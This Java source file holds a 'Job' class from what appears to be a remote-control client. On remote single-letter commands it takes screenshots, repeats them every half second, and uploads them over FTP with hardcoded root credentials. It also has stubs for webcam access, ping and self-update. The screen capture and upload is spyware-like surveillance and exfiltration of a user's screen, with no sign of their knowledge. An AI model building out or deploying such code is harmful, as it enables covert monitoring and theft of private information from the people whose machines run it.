// Function HashMap libs
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.awt.AWTException;
// Make printScr libs
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;

// Access FTP
import it.sauronsoftware.ftp4j.FTPAbortedException;
import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPDataTransferException;
import it.sauronsoftware.ftp4j.FTPException;
import it.sauronsoftware.ftp4j.FTPIllegalReplyException;

// Access webcam



public class Job implements Runnable {
// FTP connection details
	final String ftpServer= "localhost"; // Server IP
	final String ftpUserName= "root";
	final String ftpPwd= "testtest";
	
	
// Sync the same system object from file
	thatSys sys;
	char c;
	String[] args;
	
	Job(){ }
	Job( thatSys sys ){ this.sys= sys; }
	Job( thatSys sys, char c, String[] args ){
		this.sys= sys;
		this.c= c;
		this.args= args;
		
	}
	
	void prt( String s ){ System.out.println( s ); }
	
// update file to server
	void ftpTool( File file, Boolean o, String ...args  ){
		if(thatSys.DEBUG) prt( " Connecting to FTP ..." ); 
		FTPClient ftpClient = new FTPClient();
		
		try { 
	// Make FTP Connection
		ftpClient.connect(ftpServer); 	
		ftpClient.login(ftpUserName, ftpPwd);
		
	// Upload file
		if( o ){ 
			if( thatSys.DEBUG ) prt( " Upload file ..." );
			ftpClient.upload(file);
		}
	// Download
		else{
			File loc= new File( args[0] );
			ftpClient.download( args[1], loc);
			
		}
		
		
		} catch(IllegalStateException | IOException | FTPIllegalReplyException | FTPException | FTPDataTransferException | FTPAbortedException e) {
			if( thatSys.DEBUG ) prt( " FTP Connection error!" );
			
			e.printStackTrace();
		}
	}
	
	
// Ping one IP address or address
	void ping( String IP ){
		prt( IP );
		
		
		
	}
	
// Get printScreen
	void getPrtSc() throws AWTException, IOException{
		Robot robot= new Robot();
		BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
		File img= new File( "C:\\"+ sys.UUID +".jpg" );
		ImageIO.write(screenShot, "JPG", img );
			
		if( thatSys.DEBUG ) prt(" PrintScreen created with name: "+ sys.UUID);
		ftpTool( img, true );
	}
	
// Make printScreen
	void makePrtSc(int video) throws AWTException, IOException{
		if( video == 0 ) getPrtSc();
		else while( thatSys.myJobs[0].charAt(0) == 'P' ){
			getPrtSc();
			try {
				TimeUnit.MILLISECONDS.sleep( 500 );
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
			
	}
	
// Client update method
	void update(Double ver){
		if( thatSys.DEBUG ) prt(" Try to update client");
		if( sys.version < ver ){ if( thatSys.DEBUG ) prt(" No need to update" ); }
		else{
			if( thatSys.DEBUG ) prt(" Client need 2 update" ); 
			
			
		}
	}
	
	
	void setRefreshTime( String s){ thatSys.timeToRefresh= Integer.parseInt( s ); }
	
	 
	Boolean accessWebCam(){
		 
		 
		return null;
	 }
	
	
	
	public static Map<Character, Runnable> commands = new HashMap<>();
	void execute( char c, String[] arg  ){
		try{
			arg[0]= ( arg[0] != null)? arg[0] : "0";
			prt( arg[0] );
			// commands map
			commands.put( 'p', () -> ping( arg[0] ));
			commands.put( 'P', () -> { try { makePrtSc( Integer.parseInt( arg[0] )  ); } catch (Exception e) { e.printStackTrace(); } } );
			commands.put( 'u', () -> update( Double.parseDouble( arg[0] ) ) );
			commands.put( 'r', () -> setRefreshTime( arg[0] ) );
        
        
			
			
			commands.get(c).run();   // Run command
		} catch( java.lang.NullPointerException e ){ thatSys.errorLevel =1; }
	}
	
	public void run() {
		if( thatSys.DEBUG ) prt( " Start job thread!" );
		execute( c, args );
	}
	
	
	
}